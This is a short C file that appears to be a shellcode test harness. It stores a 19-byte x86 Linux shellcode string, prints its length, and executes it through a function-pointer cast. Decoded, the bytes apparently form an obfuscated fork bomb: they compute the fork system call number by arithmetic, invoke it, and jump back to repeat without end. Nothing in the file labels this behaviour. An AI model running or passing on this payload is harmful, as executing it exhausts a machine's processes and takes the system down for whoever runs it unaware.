/*
 * Put your assembler file here
 */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
		       "\x83\xe9\x33\x29\xc0\xb0\xde\x2c\xdc\x6a\x0b\x6a\x02\xb0\x02\xcd\x80\xeb\xed";
		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
